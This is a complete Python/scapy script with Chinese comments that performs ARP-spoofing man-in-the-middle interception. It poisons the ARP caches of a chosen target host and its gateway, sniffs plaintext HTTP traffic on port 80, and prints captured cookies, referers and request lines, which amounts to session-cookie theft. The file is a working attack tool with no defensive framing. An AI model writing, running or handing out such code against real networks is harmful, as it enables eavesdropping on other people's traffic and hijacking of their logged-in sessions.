from scapy.all import *
import time
from threading import Thread

def main():
    conf.verb=0
    target_ip=input("[*]请输入目标ip: ")
    gateway_ip=input("[*]请输入网关地址:" )
    #将ip转换为mac
    target_mac=get_mac(target_ip)
    gateway_mac=get_mac(gateway_ip)
    #启动arp欺骗
    t=Thread(target=spoofing_target,args=(target_ip,target_mac,gateway_ip,gateway_mac))
    # 当主线程结束时，子线程自动结束
    t.setDaemon(True)
    t.start()
    #嗅探数据包
    sniff(filter="tcp port 80",prn=packet_callback,store=0)
    #恢复arp缓存
    restore_target(target_ip,target_mac,gateway_ip,gateway_mac)


#定义ip转换为mac函数
def get_mac(ip):
    response, unanswered = srp(Ether(dst="00:0c:29:44:43:21") / ARP(pdst=ip), timeout=2)
    for s, r in response:
        return r[ARP].hwsrc

#定义arp欺骗函数
def spoofing_target(target_ip,target_mac,gateway_ip,gateway_mac):
    #欺骗靶机
    target = ARP()
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = target_mac
    target.op = 2
    #欺骗网关
    gateway=ARP()
    gateway.psrc=target_ip
    gateway.pdst=gateway_ip
    gateway.hwdst=gateway_mac
    gateway.op=2
    print("[*]开启arp欺骗,下面开始监听......")
    while True:
        send(target)
        send(gateway)
        time.sleep(2)

#定义数据包嗅探函数
def packet_callback(packet):
    if packet[TCP].payload:
        cookie_packet = bytes(packet[TCP].payload)
        if b"Cookie" in cookie_packet:
            for info in cookie_packet.split(b'\n'):
                if b'Referer' in info or b'GET /' in info or b'POST /' in info:
                    print(info)
                elif b'Cookie' in info:
                    print(info, "\n")
#定义恢复缓存函数
def restore_target(target_ip, target_mac, gateway_ip, gateway_mac):
    print("[*]恢复缓存....")
    # 恢复靶机缓存
    send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

    # 恢复网关缓存
    send(ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

if __name__ == '__main__':
    main()